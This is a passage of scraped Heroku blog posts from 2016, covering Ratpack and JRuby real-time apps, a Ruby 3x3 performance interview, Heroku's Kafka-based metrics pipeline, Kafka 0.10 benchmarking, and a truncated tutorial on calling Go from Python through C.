Blocking.get method is part of the Ratpack framework. It returns a Promise, which executes a Ruby block asynchronously. A promise is a unit of work queued to be executed, The work is executed when some other code subscribes to the promise by calling the then method. After the Promise is executed, the block passed to the then method is executed. This API is inspired by Node.js and it’s popular event-driven architecture. But unlike Node.js, Ratpack's execution model guarantees execution order. It can also detect when there is no more user code to execute, which means it can notify the user of some issue on the server side. Ratpack and JRuby also have the benefit of a multithreaded platform in the JVM. This characteristic makes JRuby and Ratpack a great platform for real-time apps.\nBuilding real-time apps\nReal-time web apps update users with new data as soon as it’s available, rather than requiring them to ask for it or refresh a page. The classic example is a chat application. In many cases, real-time apps are implemented using Websockets. To demonstrate this with Ratpack, you could modify the steaming example you created earlier to use the WebSockets.websocketBroadcast() method to broadcast the output. For example: WebSockets.websocketBroadcast(ctx, publisher) Then with the appropriate client-side code, you could consume this streaming service. But Ratpack also includes a built-in module that uses Websockets to stream metrics data for your application's runtime. It uses Dropwizard Metrics, another JVM library to capture memory usage, response time, and other data. To use the module, switch your Git repo to the “metrics” branch by running this command: $ git checkout -t origin/metrics In the server.rb file, you’ll see this code, which sets up the Dropwizard module: b.server_config do |config|\n  config.base_dir(BaseDir.find)\n  config.props(\"application.properties\")\n  config.require(\"/metrics\", DropwizardMetricsConfig.java_class)\nend\n\nb.registry(Guice.registry { |s|\n  s.module(DropwizardMetricsModule.new)\n}) In the handlers block, you’ll see this code, which sets up the metrics view and the websocket handler: chain.files do |f|\n  f.dir(\"public\").indexFiles(\"metrics.html\")\nend\n\nchain.get(\"metrics-report\", MetricsWebsocketBroadcastHandler.new) The client-side, in metrics.html and metrics.js , is fairly standard Websocket code. Deploy the metrics branch to Heroku by running this command: $ git push -f heroku metrics:master Then open the metrics view by running this command: $ heroku open metrics.html You’ll see the dynamically generated gauges and graphs that represent the real runtime data for your application. Make a few requests to the app, and you’ll notice that they change on their own. Frank, Dean, Sammy and you Ratpack opens the door for powerful and modern Ruby applications that are both pleasant to develop and reactive. Under the hood, Ratpack uses Netty , an asynchronous event-driven networking framework, which is the cutting edge of server technology . Ratpack is a great way to take advantage of many modern architectural patterns without giving up the Ruby language you love. Joe Kutner is the author of Deploying with JRuby 9k and the JVM Platform Owner at Heroku.", "date": "2016-05-24,"},
{"website": "Heroku", "title": "Where Will Ruby Go Now? Talking with Tenderlove at RailsConf", "author": ["Andrew Konoff"], "link": "https://blog.heroku.com/where_will_ruby_go_now_talking_with_tenderlove_at_railsconf", "abstract": "Where Will Ruby Go Now? Talking with Tenderlove at RailsConf Posted by Andrew Konoff May 12, 2016 Listen to this article Last week at RailsConf in Kansas City, Terence Lee and Richard Schneeman of Heroku’s Ruby Task Force sat down with the legendary Aaron Patterson (AKA tenderlove). Aaron has been working hard to make Ruby three times faster — a goal that Matz called Ruby 3x3 . Along the way, Aaron has discovered that Ruby may face a hard decision. On one side, Ruby can continue to be the productive, general-purpose scripting language that it looks like today. But the other side of Ruby is that it’s used to run long-running processes in Rails applications, pushing it to be more performant, strongly-typed, and memory-heavy. Ruby can't prioritize both. To find out where Aaron thinks Ruby’s going, you can read the abridged transcript below the fold — but to hear all about his new job at Github, Ruby performance, mechanical keyboards, grumpy cats, and more, you should listen to the whole recording right here . Richard Schneeman : The stuff you've been working on — we've seen you tweeting a lot about Ruby performance — how's that coming along? Aaron Patterson : Good, although, we just stepped out of Koichi's talk, and he basically ruined my talk [laughs]. But I've been working on different stuff. Like loading precompiled byte code, and looking at faster method caches or different types of method caches. Other things I've been thinking about is just — I'll cover this in my talk tomorrow — but improving memory efficiency, that type of stuff. Mostly what i've been poking at. Though in Koichi's talk, [he said] loading precompiled code isn't helping that much, but I got different numbers than he did, so I'm hopeful, I guess? The thing is though, when Koichi's putting out numbers, I watch and i'm like - he's probably right! So yeah, I'll be talking about that stuff tomorrow. Richard : so you just threw out a bunch of performance optimization stuff. I'm kinda curious, where do you get inspiration from? Do you just pick up and say, 'i'm gonna try this technique?' or do you look at what other languages are doing, or are there resources or some VM implementer's handbook for performance that you're skimming off of? Aaron : No, typically, I just read about stuff like what JRuby — to be honest, it's mostly me just talking to the JRuby folks. 'So, hey, what do you folks do to improve performance on your VM?' And they tell me that stuff, and I'm like, 'hm, I wonder if MRI does that? Oh no they don't? Let's try that!' So it's mostly just stealing. That's basically where I get my inspiration from — all the hard work that everyone else has done. Terence Lee : Well I feel like all the great software, a lot of the great software eventually does that, right? I remember Yehuda was talking about how Ember will eventually steal all the great ideas from everyone else, and then it will be great again. Aaron : I think it's interesting though — one thing, you know, I don't know, Koichi keeps talking about these incremental speedups and stuff, and he's like, 'well, it's not that much.' And I understand it's not that much, but cumulatively, we combine all these not-that-much optimizations together and eventually we'll be, you know, 3x faster. So I don't think he should discount that type of work. Richard : Absolutely, Koichi has done some fantastic work. Terence : So with regards to Ruby 3x3 and performance, I know last year you were working on a JIT [just-in-time compiler]. Is it still legit? Aaron : No it's not. It's not [laughs] . It's too hard. It's way too hard. It's super hard. And there's concerns about, like, how much memory consumption, stuff like that. I haven't been working on that lately. Basically, I got a little bit going, and then I was like, you know what? This is hard. So I quit. [laughs] Richard : Would any of the ahead-of-time compilation work help the JIT at all? Or is it really tangential? Aaron : It's tangential. I mean you can do some stuff, like if you do ahead-of-time compilation and you, let's say, run your application and take statistics on the stuff that you execute, maybe you can take that bytecode and perform optimizations on it afterwards. But that's not just in time. We did some analysis and we can take this bytecode and I can actually improve the performance of this bytecode based on the stats that we took from running the website or whatever. But that's not just-in-time, it means you have to run your slow code for a while to figure out what to do and modify the bytecode later. That's one technique you can do, but I don't think that technique is nearly as popular as just doing a JIT. Because the JIT, you're essentially doing that, but you're doing it then, while you're running. Richard : Doing it live. Aaron : Yes, doing it live. I mean I think that we'll have, I hope that we'll get a JIT, it would be nice. Terence : Do you think a JIT is required to hit the 3x3 performance goal? Aaron : Yeah, definitely. I absolutely believe we'll need a JIT for the 3x3. Every time I've talked to Koichi about doing a JIT, he's like, 'no, dude, it'll take too much memory,' is basically the argument. So I know that memory requirements are important for people who run on platforms like Heroku, so having a low-memory solution is important. On the other hand, I keep thinking like, well, it may take more memory but we could have a flag for it, or something like that. You could opt-in, like ruby --fast , and have it go– Terence : The JVM has development and server mode too. Aaron : Yeah, exactly. You can flip that with flags and stuff. So I don't really see how memory usage would be that much of an argument. Though, when you look at the stuff that Chris Seton has done on Truffle Ruby , so Truffle + JRuby — that thing is super fast, but you'll notice that in presentations that they never talk about memory consumption. They never talk about it. Terence : He also doesn't talk about the warm-up time. Aaron : Nope, they don't talk about the warm-up time. Nope. Not at all. It was funny, I read his PhD thesis, which was really awesome, it was a good paper, I recommend people to read this thesis. But it's very specific: 'we do not care about' — there is a line — 'we do not care about memory.' [laughs] Richard : I mean memory's cheap, right? Just go to that website, downloadmoreram.com! [laughs] Terence : Presumably, if it initially took a lot of memory, there's work and optimizations that can be done to ratchet that down over time too, right? Aaron : Sure. I guess… you can't please everybody. If you make it use more memory, people are gonna complain that it uses more memory. If you make it use less memory but it's slower, people complain that it's slow. Everybody's gonna complain. Richard : I guess Ruby was a originally a general-purpose scripting language, and I think that that's some of the emphasis behind, 'we don't want to emphasize too much on too much memory usage.' Do you ever think that — [ Aaron pulls out a keyboard ] — do you ever think that attitude will change from Matz and the Ruby core to say, yes! We are more of a long-lived process type of a language? Or more like living with some of these tradeoffs, where maybe we run with this flag, but I guess then we kind of end up in Java land where there's like a billion flags? Aaron : Well, I think we have to move in that direction. I mean I know that one thing I really like about Ruby, or why I love Ruby so much is part of that fast bootup. I can write a quick little script, run it and it's like, I did my job, now go off to do something else. But on the other hand, when you consider how people are making a living off of Ruby, how Ruby is feeding your family, it's typically with long-lived server processes. You're writing websites and stuff with processes that live for a long time. If we wanna continue to use Ruby as a way to make money, we're gonna have to support that stuff long-term. I'm sure that the attitude will change, but I don't think it's gonna be an extreme direction. It'll be somewhere in the middle. We'll find some sort of compromises we can make. ruby rails ruby 3x3 performance java", "date": "2016-05-12,"},
{"website": "Heroku", "title": "Heroku Metrics", "author": ["Andrew Gwozdziewycz"], "link": "https://blog.heroku.com/heroku-metrics-there-and-back-again", "abstract": "Heroku Metrics Posted by Andrew Gwozdziewycz May 25, 2016 Listen to this article For almost two years now, the Heroku Dashboard has provided a metrics page to display information about memory usage and CPU load for all of the dynos running an application. Additionally, we've been providing aggregate error metrics, as well as metrics from the Heroku router about incoming requests: average and P95 response time, counts by status, etc. Almost all of this information is being slurped out of an application's log stream via the Log Runtime Metrics labs feature. For applications that don't have this flag enabled, which is most applications on the platform, the relevant logs are still generated, but bypass Logplex , and are instead sent directly to our metrics processing pipeline. Since its beta release, Dashboard Metrics has been a good product. Upgrading from good to great unearthed some interesting performance hurdles, as well as doubling our CPU requirements, which simply became bumps when we just slapped a \"Powered by Kafka \" sticker on it. What follows is a look back at the events and decisions that lead us to enlightenment . Historically Speaking... Historically speaking, if a Heroku user wanted system level metrics about their apps, they had two choices: Setup an add-on such as New Relic , or Librato Setup a Logplex drain, add the log-runtime-metrics flag and build their own tooling around it. In August of 2014, a third option became available--we shipped visualizations for the past 24 hours of 10-minute roll-up data right in the dashboard! The architecture for the initial system was quite simple. We received incoming log lines containing metrics (the same log lines a customer sees when they turn on log-runtime-metrics), and turned them into points which we would then persist to a 21 shard InfluxDB cluster, using consistent hashing . The dashboard then queried the relevant metrics via a simple API proxy layer and rendered them. Our InfluxDB setup just worked, so well in fact, that for nearly two years the only maintenance we did was upgrade the operating system to Ubuntu Trusty! We were still running a nearly 2-year-old release! ( Note: all opinions are based on the 0.7.3 release, which has long been dropped from support. InfluxDB served us incredibly well, and we are eternally grateful for their effort.) Re-Energizing As we sat back and collected user experiences about Dashboard Metrics, it was clear that our users wanted more. And we wanted to deliver more! We spun off a new team charged with building a better operational experience for our customers, with metrics being at the forefront. Almost immediately we shipped 2 hours of data at 1-minute resolution, and started enhancing the events that we can show by querying internal APIs.  We've since added restart events, scaling events, deployment markers, configuration changes, and have lots of other enhancements planned. But, as we were starting to make these changes, we were realizing that our current infrastructure wasn't going to cut it. We set off researching ideas for how to build our next generation metrics pipeline with a few overarching goals: Make it extensible. Make it robust. Make it run on Heroku. The last goal is most important for us. Yes, of course, we want to ensure that whatever system we put in place is tolerant against failures and that it can be extended to drive new features. But, we also want to understand what operational headaches our customers have firsthand so we can look at developing features that address them, instead of building features that look nice on paper but solve nothing in practice. Plus, our coworkers already operate the hell out of databases and our runtimes. It'd be foolish to not leverage their skills! An Idealist Architecture The data ingestion path for a metrics aggregation system is the most critical. Not seeing a spike in 5xx errors during a flash sale makes businesses sad. Being blind to increased latency makes customers sad. A system which drops data on the floor due to a downstream error makes me sad. But, in our previous system, this could happen and did happen anytime we had to restart a node. We were not robust to restarts, or crashes, or really any failures. The New System Had to Be. With our previous setup, when data was successfully stored in InfluxDB, that was pretty much the end of the line. Sure, one can build systems to query the data again, and we have, but with millions of constantly changing dynos, and metric streams as a result, knowing what to query all the time isn't all that easy. Data in the New System Should Never Rest. Our summarization of raw data with InfluxDB relied on continuous queries , which while convenient, were fairly expensive. When we added continuous queries for 1-minute resolution, our CPU load doubled. We Should Only Persist Rolled Up Data. With these three properties in mind, we found stream processing, specifically with Apache Kafka , to fit our needs quite well. With Kafka as the bus between each of the following components, our architecture was set. Ingestion: Parses Logplex frames into measurement data and commits them to Kafka Summarization: Group measurements by app/dyno type as appropriate for the metric and computes count, sum, sum of squares, min, max for each measurement for each 1 minute of data, before committing back to Kafka. Sink: Writes the summarized data to persistent storage, however appropriate. Building on Heroku We ran into a number of problems, not the least of which is the volume and size of HTTP requests we get from Logplex, and the other metrics producing systems. Pushing this through the shared Heroku router was something we wanted to avoid. Fortunately, Private Spaces was entering beta and looking for testers. We became customers. Overall, our architecture looks like this: Let's dive into the different pieces. Private Spaces With Private Spaces , a customer gets an isolated \"mini-Heroku\" into which to deploy apps. That isolation comes with an elastic routing layer, dedicated runtime instances, and access to the same exact Heroku experience one gets in the common runtime (pipelines, buildpacks, CLI tools, metrics, logging, etc). It was only natural for us to deploy our new system into a space. Our space runs 4 different apps, all of which share the same Go code base. We share a common code base to reduce the pain of package dependencies in Go and to better ensure compatibility between services. Metrics Ingress By design, our ingress app is simple. It speaks the Logplex drain protocol over HTTP and converts each log line into an appropriate Protocol Buffers encoded message. Log lines representing router requests, for instance, are then in turn produced to the ROUTER_REQUESTS Kafka topic. Yahtzee: An Aggregation Framework We custom built our aggregation layer instead of opting to run something like Spark on the platform. The big stream processing frameworks all make assumptions about the underlying orchestration layer, and some of them even require arbitrary TCP connections, which Heroku on the whole, doesn't currently support. Also, at the time we were making this decision, Kafka Streams was not ready for prime time, so instead we built a simple aggregation framework in Go that runs in a dyno and plays well with Heroku Kafka. In reality, building a simple aggregation framework is pretty straightforward for our use case. Each of our consumers is a large map of accumulators that either just count stuff, or perform simple streaming computations like min, max, and sum. Orchestrating which dynos consume which partitions was done with an upfront deterministic mapping based on the number of dynos we want to run and the number of partitions we have. We trust Heroku's ability to keep the right number of dynos running, and slightly over-provision to avoid delays. While straightforward, there were a few hurdles we encountered building this framework, including late arrival of data and managing offsets after an aggregation process restarts. Late Arrivals While it'd be amazing if we can always guarantee that data would never arrive late, it's just not possible. We regularly receive measurements as old as 2 minutes, and will count measurements up to 5 minutes old. We do this by keeping around the last 5 summary accumulators, and flushing them on change (after a timeout, of course) to the appropriate compacted summary topic. Offset Management When the aggregation process restarts, the in-memory accumulators need to reflect the last state that they were in before the restart occurred. Because of this, we can't simply start consuming from the latest offset, and it would be wrong to mark an offset that wasn't yet committed to a summary. Therefore, we keep track of the first offset seen for every new time frame ( e.g. each minute) and mark the offset from 5 minutes ago after flushing the summaries for the current minute. This ensures that our state is rebuilt correctly, at the expense of extra topic publishes. (Did I mention our use of compacted topics?) Postgres Sink (Another Yahtzee Component) Each sink process consumes a number of partitions for each topic, batches them up by shard and type, and uses a Postgres COPY FROM statement to write 1024 summaries at a time. This seems to perform quite well and is certainly better performing than an INSERT per summary. Our database schemas more or less match the layout of log-runtime-metrics data, but include additional columns like min, max, sum, sum of squares, and count for the metrics to aid in downsampling and storytelling purposes. Metrics API The API is a simple read-only HTTP over JSON service. In addition to selecting the appropriate data from the appropriate shards, and authenticating against the Heroku API, the Metrics API has the ability to downsample the 1-minute data on demand. This is how we continue to serve 10-minute roll-up data for the 24-hour views. We would like to eventually expose these endpoints officially as part of the Heroku API, but that work is not currently scheduled. Heroku Kafka That left Kafka. Until a few weeks ago , there wasn't really an option for getting Kafka as a service, but as Heroku insiders, we were alpha and now beta testers of Heroku Kafka long before the public beta was announced. We don't complicate our usage of Kafka. Dyno load average measurements, like all of the other measurement types, for instance, have 3 topics associated with them. DYNO_LOAD.<version> are raw measurements. A compacted DYNO_LOAD_SUMMARY.<version> summarizes / rolls up measurements. The rollup period is contained within the message, making it possible for us to store 1 minute, and (potentially) 15-minute rollups in the same topic if we need to. Lastly, the RETRY.DYNO_LOAD_SUMMARY.<version> topic is written to when we fail to write a summary to our Postgres sink. Another process consumes the RETRY topics and attempts to persist to Postgres indefinitely. Each of these topics is created with 32 partitions, and a replication factor of 3, giving us a bit of wiggle room for failure. We partition messages to those 32 partitions based on the application's UUID, which we internally call owner since a measurement is \"owned\" by an app. Even though we continue to use owner for partitioning, our compacted, summary topics produce messages with a key that includes the time for which the summary was for. We do this with a custom partitioner that simply ignores the parts of the key that aren't the owner. Heroku Postgres Given our plan of storing only summarized data, we felt (and still believe) that a partitioned and sharded Postgres setup would work and made sense. As such, we have 7 shards, each running on the Heroku Postgres private-4 plan. We create a new schema each day with fresh tables for each metric type. This allows us to easily reign in our retention strategy with simple DROP SCHEMA statements, which are less expensive than DELETE statements on large tables. The owner column, as it has throughout, continues to be the shard key. While our performance is acceptable for our query load, it's not exactly where we'd like it to be, and feel it could be better. We will be looking at ways in which to further optimize our use of Postgres in the future. Lessons and Considerations No system is perfect, and ours isn't some magical exception. We've learned some things in this exercise that we think are worth pointing out. Sharding and Partitioning Strategies Matter Our strategy of using the owner column for our shard/partitioning key was a bit unfortunate, and now hard to change. While we don't currently see any ill effects from this, there are hypothetical situations in which this could pose a problem. For now, we have dashboards and metrics which we watch to ensure that this doesn't happen and a lot of confidence that the systems we've built upon will actually handle it in stride. Even still, a better strategy, likely, would have been to shard on owner + process_type (e.g. web), which would have spread the load more evenly across the system. In addition to the more even distribution of data, from a product perspective it would mean that in a partial outage, some of an application's metrics would remain available. Extensibility Comes Easily with Kafka The performance of our Postgres cluster doesn't worry us. As mentioned, it's acceptable for now, but our architecture makes it trivial to swap out, or simply add another data store to increase query throughput when it becomes necessary. We can do this by spinning up another Heroku app that uses shareable add-ons, starts consuming the summary topics and writes them to a new data store, with no impact to the Postgres store! Our system is more powerful and more extensible because of Kafka. Reliability in a Lossy Log World? While we're pretty confident about the data once it has been committed to Kafka, the story up until then is murkier. Heroku's logging pipeline, on which metrics continue to be built, is built on top of lossy-by-design systems . The logging team, of course, monitors this loss and maintains it at an acceptable level, but it means that we may miss some measurements from time to time. Small loss events are typically absorbed via our 1-minute rollup strategy. Larger loss events due to system outages are, historically and fortunately, very rare. As we look to build more features on top of our metrics pipeline that require greater reliability in the underlying metrics, we're also looking at ways in which we can ensure our metrics end up in Kafka. This isn't the end of the discussion on reliability, but rather just the beginning. In Conclusion? This isn't the end of the story, but rather just the humble beginnings. We'll continue to evolve this system based on internal monitoring and user feedback. In addition, we rebuilt our metrics pipeline because there are operational experiences we wish to deliver that now become dramatically easier. We've prototyped a few of them and hope to start delivering on them rapidly. Finally, it goes without saying that we think Kafka is a big deal. We hope this will inspire you to wonder what types of things Kafka can enable for your apps. And, of course, we can only hope that you'll trust Heroku to run that cluster for you ! dashboard metrics", "date": "2016-05-25,"},
{"website": "Heroku", "title": "Apache Kafka 0.10", "author": ["Tom Crayford"], "link": "https://blog.heroku.com/apache-kafka-010-evaluating-performance-in-distributed-systems", "abstract": "Apache Kafka 0.10 Posted by Tom Crayford May 27, 2016 Listen to this article At Heroku, we're always striving to provide the best operational experience with the services we offer. As we’ve recently launched Heroku Kafka, we were excited to help out with testing of the latest release of Apache Kafka, version 0.10, which landed earlier this week. While testing Kafka 0.10, we uncovered what seemed like a 33% throughput drop relative to the prior release. As others have noted , “it’s slow” is the hardest problem you’ll ever debug, and debugging this turned out to be very tricky indeed. We had to dig deep into Kafka’s configuration and operation to uncover what was going on. Background We've been benchmarking Heroku Kafka for some time, as we prepared for the public launch . We started out benchmarking to help provide our users with guidance on the performance of each Heroku Kafka plan. We realized we could also give back to the Kafka community by testing new versions and sharing our findings. Our benchmark system orchestrates multiple producer and consumer dynos, allowing us to fully exercise a Kafka cluster and determine its limits across the various parameters of its use. Discovery We started benchmarking the Kafka 0.10.0 release candidate shortly after it was made available. In the very first test we ran, we noted a 33% performance drop. Version 0.9 on the same cluster configuration provided 1.5 million messages per second in and out at peak, and version 0.10.0 was doing just under 1 million messages per second. This was pretty alarming. There could be some major disincentives to upgrade to this version with such a large reduction in throughput, if this condition were present for all users of Kafka. We set out to determine the cause (or causes) of this decrease in throughput. We ran dozens of benchmark variations, testing a wide variety of hypotheses: Does this only impact our largest plan? Or are all plans equally impacted? Does this impact a single producer, or do we have to push the boundaries of the cluster to find it? Does this impact plaintext and TLS connections equally? Does this impact large and small messages equally? And many other variations. We investigated many of the possible angles suggested by our hypotheses, and turned to the community for fresh ideas to narrow down the cause. We asked the Kafka mailing list for help, reporting the issue and all the things we had tried. The community immediately dove into trying to reproduce the issue and also responded with helpful questions and pointers for things we could investigate. During our intensive conversation with the community and review of the conversations that lead up to the 0.10 release candidate, we found this fascinating thread about another performance regression in 0.10. This issue didn't appear to line up with the problem we had found, but it helped provide more insight into Kafka that helped us understand the root cause of our particular problem. We found this other issue to be very counter-intuitive: increasing the performance of a Kafka broker can actually negatively impact performance of the whole system. Kafka relies very heavily on batching, and if the broker becomes faster, the producers batch less often. Version 0.10 included several improvements to the broker's performance, and that caused odd performance impacts that have since been fixed. To help us proceed in a more effective and deliberate manner, we started applying Brendan Gregg's USE method to a broker during benchmarks. The USE method helps structure performance investigations, and is very easy to apply, yet also very robust. Simply, it says: Make a list of all the resources used by the system (network, CPU, disks, memory, etc) For each resource, look at the: Utilization: the average time the resource was busy servicing work Saturation: the amount of extra work queued for the resource Errors: the count of error events We started going through these, one by one, and rapidly confirmed that Kafka is blazingly fast and easily capable of maxing out the performance of your hardware. Benchmarking it will quickly identify the bottlenecks in your setup. What we soon found is that the network cards were being oversaturated during our benchmarking of version 0.10, and they were dropping packets because of the number of bytes they were asked to pass around. When we benchmarked version 0.9, the network cards were being pushed to just below their saturation point. What changed in version 0.10? Why did it lead to saturation of the networking hardware under the same conditions? Understanding Kafka 0.10 brings with it a few new features. One of the biggest ones, which was added to support Kafka Streams and other time-based capabilities, is that each message now has a timestamp to record when it is created. This timestamp accounts for an additional 8 bytes per message. This was the issue. Our benchmarking setup was pushing the network cards so close to saturation that an extra 8 bytes per message was the problem. Our benchmarks run with replication factor 3, so an additional 8 bytes per message is an extra 288 megabits per second of traffic over the whole cluster: $$\n{288}\\ \\text{Mbps}\\ \\ \\ \\ =\\ \\ \\ {8} \\textstyle \\frac{\\text{bytes}}{\\text{message}}\\ \\ \\ \\times\\ \\ \\ {1.5}\\ \\text{million} \\frac{\\text{messages}}{\\text{second}}\\ \\ \\ \\times\\ \\ \\ {8} \\frac{\\text{bits}}{\\text{byte}}\\ \\ \\ \\times\\ \\ \\ {3}\\ \\tiny\\text{(1 for producer, 2 for replication)}\n$$ This extra traffic is more than enough to oversaturate the network. Once the network cards are oversaturated, they start dropping packets and doing retransmits. This dramatically reduces network throughput, as we saw in our benchmarks. To further verify our hypothesis, we reproduced this under Kafka 0.9. When we increased the message size by 8 bytes, we saw the same performance impact. Giving Back Ultimately, there's not much to do here in terms of fixing this issue by making changes to Kafka’s internals. Any Kafka cluster that runs close to the limits of its networking hardware will likely see issues of this sort, no matter what version. Kafka 0.10 just made the issue more apparent in our analyses, due to the increase in baseline message size. These issues would also happen if you as a user added a small amount of overhead to each message and were driving sufficient volume through your cluster. Production use cases tend to have a lot of variance in message size (usually a lot more than 8 bytes), so we expect most production uses of Kafka to not be impacted by the overhead in 0.10. The real trick is not to saturate your network in the first place, so it pays to model out an approximation of your data relative to your configuration. We contributed a documentation patch about the impact of the increased network traffic so that other Kafka users don't have to go through the same troubleshooting steps. For Heroku Kafka, we've been looking at a few networking improvements we can make to the underlying cluster configurations to help mitigate the impact of the additional message overhead. We've also been looking at improved monitoring and bandwidth recommendations to better understand the limits of possible configurations, and to be able to provide a graceful and stable operational experience with Heroku Kafka. Kafka 0.10 is in beta on Heroku Kafka now. For those of you in the Heroku Kafka beta , you can provision a 0.10 cluster like so: heroku addons:create heroku-kafka --version 0.10 We encourage you to check it out. Kafka Streams , added in version 0.10, makes many kinds of applications much easier to build. Kafka Streams works extremely well with Heroku, as it's just a (very powerful) library you embed in your application. If you aren't on the beta, you can request access here: https://heroku.com/kafka We would recommend that you continue to use Kafka 0.9.0.1, the default for Heroku Kafka, for production use. We are working closely with the community to further test and validate 0.10 as ready for production use. We take some time to do this, in order to iron out any bugs with new releases for our customers. The only way that happens is if people try it out with their applications (for example in a staging environment), so we welcome and encourage your use of the new version. We can’t wait to see what you build! kafka", "date": "2016-05-27,"},
{"website": "Heroku", "title": "See Python, See Python Go, Go Python Go", "author": ["Andrey Petrov"], "link": "https://blog.heroku.com/see_python_see_python_go_go_python_go", "abstract": "See Python, See Python Go, Go Python Go Posted by Andrey Petrov June 02, 2016 Listen to this article Andrey Petrov is the author of urllib3 , the creator of Briefmetrics and ssh-chat , and a former Googler and YCombinator alum. He’s here to tell us of a dangerous expedition his requests undertook, which sent them from Python, through the land of C, to a place called Go (and back again). Today we're going to make a Python library that is actually the Go webserver, for which we can write handlers in Python. It makes Python servers really fast, and—more importantly—it’s a bit fun and experimental. This post is a more detailed overview of my PyCon 2016 talk of the same title . If you'd like to play along at home, this code was written in Go 1.6 and Python 3.5 and the entire complete working thing is open source (MIT license) and and it's available to clone and fork here . First, a refresher: Running a Webserver in Go package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc index(w http.ResponseWriter, req *http.Request) {\n    fmt.Fprintf(w, \"Hello, world.\\n\")\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", index)\n    http.ListenAndServe(\"127.0.0.1:5000\", nil)\n} Running a Webserver in Python from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return 'Hello, world!\\n'\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=5000) Running a Go Webserver in Python?? from gohttp import route, run\n\n@route('/')\ndef index(w, req):\n    w.write(\"Hello, world.\\n\")\n\nif __name__ == '__main__':\n    run(host='127.0.0.1', port=5000) Yo--whaa??? That's right. Want to give it a try right now? Hit this shiny button: How? At first, Go was created to be run as a single statically linked binary process. Later, more execution modes were added to let us compile Go as dynamically linked binaries. In Go 1.5, additional modes were added to allow us to build Go code into shared library that is runnable from other runtimes. Just like how all kinds of Python modules like lxml use C to run super-optimized code, you can now run Go code just the same. More or less. Considerations Before throwing everything away and starting fresh using this newfound power, there are some challenges that need to be considered. Runtime Overhead When a Go library is used from another runtime, it spins up the Go runtime in parallel with the caller's runtime (if any). That is, it gets the goroutine threads and the garbage collector and all that other nice stuff that would normally be initialized up when running a  Go program on its own. This is different than calling vanilla C code because technically there is no innate C runtime. There is no default worker pools, no default garbage collector. You might call a C library which has its own equivalents of this, then all bets are off, but in most simple cases you get very little overhead when calling C functions. This is something to consider when calling out to code that requires its own runtime. Runtime Boundaries Moving memory (or objects) between runtimes can be tricky and dangerous, especially when garbage collectors are involved. Both Go and Python have their own garbage collector. If you share the same memory pointer between the two runtimes, one garbage collector might decide that it's no longer used and reclaim the memory while the other runtime would be all \"WHY'D YOU DO THAT??\" and crash. Or worse, it could try to move it around, or change the memory's layout in a way that the runtimes disagree, then we'd get weird hard-to-diagnose heisenbugs. The safest thing to do is to copy data across boundaries when possible, or treat it as immutable read-only data when it's too big to be copied. Runtime Demilitarized Zone When mediating calls between two runtimes like Go and Python, we use C in between them as a kind of demilitarized zone, because C has no runtime and we can trust it to not mess with our data all willy nilly. The Plan In this proof-of-concept, we use the Go webserver, but we want to provide a Python handler that will get called when our route gets hit. Make a Go webserver, easy peasy. Make it into a module that is exported into a C shared library. Add a handler registry bridge in C. Add some helpers for calling Go interface functions from C. Add headers for importing the shared library in Python. Write our handler to use the C registry bridge in Python, and the helpers to\ninteract with the data to create a response. World of Go Let's explore how to call C from Go and Go from C. Calling C from Go Calling C from Go is about as easy as it gets. In fact, we can embed C code in a comment right above an import \"C\" statement and the Go compiler will build and link it for us. package main\n\n/*\nint the_answer() {\n    return 42;\n}\n*/\nimport \"C\"\nimport \"fmt\"\n\nfunc main() {\n    r := C.the_answer()\n    fmt.Println(r)\n} We use the magic C.* namespace to access anything from the world of C, even if it's not inlined directly above it. We can #include things as we normally would, too, to import code from whichever other C files we would like to use. Additional reading material: https://blog.golang.org/c-go-cgo https://golang.org/cmd/cgo https://github.com/golang/go/wiki/cgo Calling Go from C To call Go from C, we'll need to compile our Go code as a shared object and import it. To identify which Go API we want to expose in C, we export it explicitly with an //export ... comment directive. package main\n\nimport \"C\"\n\n//export TheAnswer\nfunc TheAnswer() C.int {\n    return C.int(42)\n}\n\nfunc main() {} Three things about this code snippet: We need to make sure that the interface for the exported function is properly laden with C types. That means inputs and outputs all need to be C types, and our Go code will cast in and out of them as needed. Our shared object needs to be package main and have an empty main() function. Part of the process for CGO building into a shared library is creating an injection point for spawning the Go runtime. There are many nuances regarding passing memory from Go to C which are not expressed in this basic example. You can learn more on that in the links at the end of the section. $ go build -buildmode=c-shared -o libanswer.so This will create a libanswer.so shared object and a corresponding libanswer.h header file that we can reference from our C code. Now we'll make our C code in a different directory and bring in the libanswer.so and libanswer.h files there. #include <stdio.h>\n#include \"libanswer.h\"\n\nint main() {\n    int r = TheAnswer();\n    printf(\"%d\\n\", r);\n    return 0;\n} $ gcc -o answer main.c -L. -lanswer\n$ ./answer\n42 Success! We called Go code from C. More specific reading in the aforementioned links: https://golang.org/cmd/cgo/#hdr-C_references_to_Go https://golang.org/cmd/cgo/#hdr-Passing_pointers World of Python Now onto the Python side of this business. Same idea, so let's look at how to call Python from C and C from Python. Calling C from Python There are two approaches to calling C from Python. One method is using the C Stable ABI which lets us dive in with no additional dependencies. This works by explicitly defining all of the necessary headers and stubs that Python needs to figure out how to call the C code. The other method is using CFFI , which automatically generates all of the headers and stubs for us. We'll explore the CFFI method for the sake of convenience. # answer_build.py:\nfrom cffi import FFI\nffi = FFI()\n\nffi.cdef(\"int the_answer();\")\n\nffi.set_source(\"_answer\",\n\"\"\"\n    int the_answer() {\n        return 42;\n    }\n\"\"\")\n\nif __name__ == \"__main__\":\n    ffi.compile() Calling the CFFI file will generate the necessary boilerplate for calling this corresponding C code from Python. $ python answer_build.py\n$ ls\n_answer.c       _answer.o       _answer.so      answer_build.py Now to call it from Python, we'll need two more files: answer.py and an empty __init__.py (because Python). # answer.py:\nfrom _answer import lib\n\nr = lib.the_answer()\nprint(r) Here we go: $ python answer.py\n42 Success: we called C from Python! This was cheating a bit, in the same way we cheated in the Go version because the C was embedded inside of Python code. But, it's not that far from a real world scenario: We could just as easily #include our way into all kinds of external C logic, even if that part is embedded. There are other ways of doing this too, have a look at the CFFI documentation , but this will do for now. Putting it together: gohttplib Alternate title: The Go, The Bad, and the Ugly The full source code with Python and C examples of gohttplib is available on Github: https://github.com/shazow/gohttplib We're going to fly through the important bits really fast to get the idea of how it works and how to run it on Heroku. The Go and C package main\n\n/*\ntypedef struct Request_\n{\n    const char *Method;\n    const char *Host;\n    const char *URL;\n} 